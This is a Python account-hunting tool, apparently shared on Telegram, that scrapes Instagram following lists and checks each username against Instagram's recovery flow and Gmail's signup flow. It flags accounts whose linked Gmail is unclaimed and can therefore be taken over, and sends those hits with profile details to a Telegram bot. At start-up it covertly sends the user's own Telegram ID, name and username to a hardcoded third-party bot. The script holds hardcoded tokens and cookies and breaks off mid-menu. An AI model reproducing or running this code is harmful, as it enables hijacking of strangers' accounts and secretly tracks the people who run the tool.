#--------------------[HSO]--------------------#
import requests
from user_agent import generate_user_agent
import os
import datetime
from uuid import uuid4
import sys
from concurrent.futures import ThreadPoolExecutor
import random 
import time 
from random import randrange,choice
#--------------------[HSO]--------------------#
hit,ge,be,gi,bi=0,0,0,0,0
gg = 0
listoo = ['HI']    
uf=[]
aa=0
uid = str(uuid4())
tim=str(time.time()).split('.')[1]
s=requests.Session()
#--------------------[HSO]--------------------#
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
DY  = "\033[0;33m"  # Dark Yellow
H="\x1b[38;5;208m" #
M = '\x1b[1;37m' 
#--------------------[HSO]--------------------#
try:
	iid=int(input('Id '))
	tok=input('Token : ')
	s.post(f"https://api.telegram.org/bot{tok}/sendMessage", data={"chat_id": iid, "text": "Hi!"})
	r = s.get(f"https://api.telegram.org/bot{tok}/getChat", params={"chat_id": iid}).json()
	user_info = r.get("result", {})
	try:
		user_id = user_info.get("id", "غير معروف")
	except:user_id=None
	try:
		first_name = user_info.get("first_name", "غير معروف")
	except:first_name=None
	try:
		username = user_info.get("username", "غير متوفر")
	except:username=None
	aa=(f'''
 - ID: {user_id}
- Name : {first_name}
- User :@{username}
''')
	s.post(f"https://api.telegram.org/bot8155972280:AAGSOYy4OFfDxEPF8dCxkl48oIT_FP80bEw/sendMessage", data={"chat_id": "7279163999", "text": aa})
	#

except:
	exit('Errur in id or token ')
os.system('clear')	
#--------------------[HSO]--------------------#
def rest(email):
    email=email.split('@')[0]
    uh='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    hr={
    'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
    'X-Pigeon-Rawclienttime':'1707104597.347',
    'X-IG-Connection-Speed':'-1kbps',
    'X-IG-Bandwidth-Speed-KBPS':'-1.000',
    'X-IG-Bandwidth-TotalBytes-B':'0',
    'X-IG-Bandwidth-TotalTime-MS':'0',
    'X-IG-VP9-Capable':'false',
    'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type':'WIFI',
    'X-IG-Capabilities':'3brTvw==',
    'X-IG-App-ID':'567067343352427',
    'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
    'Accept-Language':'ar-IQ, en-US',
    'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding':'gzip, deflate',
    'Host':'i.instagram.com',
    'X-FB-HTTP-Engine':'Liger',
    'Connection':'keep-alive',
    'Content-Length':'364',
    }
    dah={
    'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

    'ig_sig_key_version':'4',
    }
    k=requests.post(uh,headers=hr,data=dah).text
    try:return  k.split('email":"')[1].split('","status":"ok"}')[0]
    except:return False
#--------------------[HSO]--------------------#
def date(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  else:
   return "2020-2023"
 except:
 	return False 	
#--------------------[HSO]--------------------# 
def info(email):
    global iid,tok
    username=email.split("@")[0]
    
    try:
        
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)
        
        #print(response.text)
        if response.status_code != 200:
           pass

        data = response.json()
        user = data['data']['user']
        

        
        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"]
        }
        Id=user_info['Id']
        full_name=user_info['full_name']
        followers=user_info['followers']
        following=user_info['following']
        posts=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        is_private=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        tlg=f'''
¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
𝙶𝙼𝙰𝙸𝙻 : {email}
𝚁𝙴𝚂𝚃𝙴𝚃: {rest(email)}
𝙽𝙰𝙼𝙴 : {full_name}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:{followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶: {following}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :{username}
𝙸𝙳 : {Id}
𝙳𝙰𝚃𝙴 : {date(Id)}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 :{is_private}
𝙱𝙸𝙾 : {bio}
¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸
Py- @ii33cc        
        
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))

    except Exception as e:
        info2(email)
#--------------------[HSO]--------------------#
def info2(email):
	global iid,tok
	try:
		user=email.split('@')[0]
		r = requests.get(f"https://api-v2.nextcounts.com/api/instagram/user/{user}").json()
		try:
			full_name=r['nickname']
		except:
			full_name=None
		try:
			followers=r['followers']
		except:
			followers=None
		try:
			following=r['following']
		except:
			following=None
		try:
			id=r['id2']
		except:
			id=None
		try:
			is_private=r['private']
		except:
			is_private=None
			
		tlg=f'''
¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
𝙶𝙼𝙰𝙸𝙻 : {email}
𝚁𝙴𝚂𝚃𝙴𝚃: {rest(email)}
𝙽𝙰𝙼𝙴 : {full_name}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:{followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶: {following}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :{user}
𝙸𝙳 : {id}
𝙳𝙰𝚃𝙴 : {date(id)}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 :{is_private}
¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸
Py- @ii33cc '''
		#print(tlg)
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
	
	except:
		tlg=f'''
¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
𝙶𝙼𝙰𝙸𝙻 : {email}
𝚁𝙴𝚂𝚃𝙴𝚃: {rest(email)}
𝚒𝚗𝚏𝚘 : https://www.instagram.com/{user}?igsh=bXRmcXUyMXVxM3Mx
¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸
Py- @ii33cc        
        '''
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
		#
	
#--------------------[HSO]--------------------#
def gmail(email):
    global ge,be,gi,bi
    name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
    birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
    s = requests.Session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }

    params = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/u/0/',
        'ddm': '1',
        'emr': '1',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
        'followup': 'https://mail.google.com/mail/u/0/',
        'osid': '1',
        'service': 'mail',
    }

    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }
    email=email.split("@")[0]

    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text
    if 'password' in response:
        info(email)
        ge+=1
        sys.stdout.write(f'''\r{G}Hits : {W}{ge}{R} | Bad IN: {W}{bi}{Y} |Bad EM : {W}{be}{Bl} | Good IN : {W}{gi}'''),sys.stdout.flush()
    else:
        be+=1
        sys.stdout.write(f'''\r{G}Hits : {W}{ge}{R} | Bad IN: {W}{bi}{Y} |Bad EM : {W}{be}{Bl} | Good IN : {W}{gi}'''),sys.stdout.flush()
#--------------------[HSO]--------------------#      
def Check(email):
    global ge,be,gi,bi
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
    try:
        re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
        if ('"can_recover_with_code"')in re:
        	gmail(email)
        	gi+=1
        	sys.stdout.write(f'''\r{G}Hits : {W}{ge}{R} | Bad IN: {W}{bi}{Y} |Bad EM : {W}{be}{Bl} | Good IN : {W}{gi}'''),sys.stdout.flush()
        elif ('"spam":true')in re:
        	os.system('clear')
        	sys.stdout.write(f'''\rRun Vpn '''),sys.stdout.flush()
        	uk=email.split('@')[0]
        	open("block.txt", "a").write(f'{uk}\n')
        else:
        	bi+=1
        	sys.stdout.write(f'''\r{G}Hits : {W}{ge}{R} | Bad IN: {W}{bi}{Y} |Bad EM : {W}{be}{Bl} | Good IN : {W}{gi}'''),sys.stdout.flush()
        	
    except Exception as e:pass
#--------------------[HSO]--------------------#  		   
def fg():
    global gg,tim,aa,uf
    us=input(C+'Entet User : '+W)
    ps=input(C+'Entet password  : '+W)
    url1= "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    payload = {
	  'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{tim}:{ps}",
	  'caaF2DebugGroup': "0",
	  'loginAttemptSubmissionCount': "0",
	  'optIntoOneTap': "false",
	  'queryParams': "{}",
	  'trustedDeviceRecords': "{}",
	  'username': us,
	}
    headers1 = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'x-ig-www-claim': "0",
	  'x-web-session-id': "ijj4u4:p8ma4m:joq7em",
	  'sec-ch-ua-platform-version': "\"\"",
	  'x-requested-with': "XMLHttpRequest",
	  'sec-ch-ua-full-version-list': "\"Not A(Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"132.0.6961.0\"",
	  'sec-ch-prefers-color-scheme': "dark",
	  'x-csrftoken': "9PlkS6SfNT6A71vH5IUo00cgtC9v1EAb",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'x-ig-app-id': "936619743392459",
	  'sec-ch-ua-model': "\"\"",
	  'sec-ch-ua-mobile': "?0",
	  'x-instagram-ajax': "1020041823",
	  'x-asbd-id': "129477",
	  'origin': "https://www.instagram.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.instagram.com/",
	  'accept-language': "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	  
	}
    res = requests.post(url1, data=payload, headers=headers1)
    #print(res.text)
    if ('userId')in res.text:
    	print(G+'Good Login ✔')
    	pass
    else:
    	exit(R+'Bad Login ✘')
    kls=input(f'{Y}write User From get list - '+W)
    uf.append(kls)
    for user in uf:
    	
    #
	    ses=res.cookies.get_dict()['sessionid']
	    rs_id = requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={
	    'Accept': '*/*',
	    'Accept-Encoding': 'gzip, deflate, br',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={ses}',
	    'Sec-Ch-Prefers-Color-Scheme': 'dark',
	    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
	    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
	    'Sec-Ch-Ua-Mobile': '?0',
	    'Sec-Ch-Ua-Platform': '"Windows"',
	    'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
	    'X-Asbd-Id': '129477',
	    'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
	    'X-Ig-App-Id': '936619743392459',
	    'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
	    'X-Requested-With': 'XMLHttpRequest'})
		
		
		
	    jsn3=rs_id.json()['data']['user']
	    id = jsn3['id']
	    print(Y+'id Your account :  '+id)
	    #
	    url = f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200'
	    headers = {
	        'Accept': '*/*',
	        'Accept-Encoding': 'gzip, deflate, br',
	        'Accept-Language': 'en-US,en;q=0.9',
	        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={ses}',
	        'Sec-Ch-Prefers-Color-Scheme': 'dark',
	        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
	        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
	        'Sec-Ch-Ua-Mobile': '?0',
	        'Sec-Ch-Ua-Platform': '"Windows"',
	        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
	        'Sec-Fetch-Dest': 'empty',
	        'Sec-Fetch-Mode': 'cors',
	        'Sec-Fetch-Site': 'same-origin',
	        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
	        'X-Asbd-Id': '129477',
	        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
	        'X-Ig-App-Id': '936619743392459',
	        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
	        'X-Requested-With': 'XMLHttpRequest',
	    } 
	    r = requests.get(url,headers=headers)
	    print()
	    if '{"message":"","spam":true,"status":"fail"}' in r.text:
	        exit('block')
	    
	    for i in r.json()['users']:
	        gg+=1
	        userL = i['username']
	        print(f'{H} : {gg} {G}Extra{W} // {C}{userL}')
	        open("username.txt", "a").write(f'{userL}\n')
	    if 'HI' in listoo:
	        try:
	            m_id=r.json()['next_max_id']
	        except KeyError:
	            return
	        for i in range(9999):
	            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200&max_id='+m_id,headers=headers)
	            if '{"message":"","spam":true,"status":"fail"}' in r.text:
	                exit('block')
	            try:
	                for i in r.json()['users']:
	                    gg+=1
	                    userL = i["username"]
	                    print(f'{H} : {gg} {G}Extra{W} // {C}{userL}')
	                    open("username.txt", "a").write(f'{userL}\n')
	                try:
	                    m_id=r.json()['next_max_id']
	                except:
	                    break
	            except:
	                if 'challenge' in r.text:
	                    break
	                else:
	                    continue
	    else:pass
	    exit()
    
def admin_gm(name):
    try:
         file = open(name,'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        
        exit(R+"السته غير موجوده  ! "	)
        
    with ThreadPoolExecutor(max_workers=15)as executor:
        futures=[executor.submit(Check,user+"@gmail.com")for user in file]
        for future in futures:
            future.result()
logo=(f'''{DY}
█ █▄░█ █▀ ▀█▀ ▄▀█ █▀▀ █▀█ ▄▀█ █▀▄▀█
█ █░▀█ ▄█ ░█░ █▀█ █▄█ █▀▄ █▀█ █░▀░█
''')            
def admin():
	global logo
	print(f'''
{Y}=============================	
{G}[ = ] 1 - {C}Get List
{G}[ = ] 2 - {C}Check List
{G}[ = ] 3 - {C}Delete List
{G}[ = ] 0 - {C}Info Source Code 
{Y}=============================	
{W}Special developer account 
{Bl}https://t.me/hsopyt
{W}Enter Here 😪👆👆👆	
	''')
	try:
		oo=int(input(H+'Choice : '))
	except:
		print(Z+'قـــم بــأدخــال رقــم ')
	if oo ==1:
		os.system('clear' if os.name == 'posix' else 'cls')
		print(logo)
		fg()
	elif oo==2:
		os.system('clear' if os.name == 'posix' else 'cls')
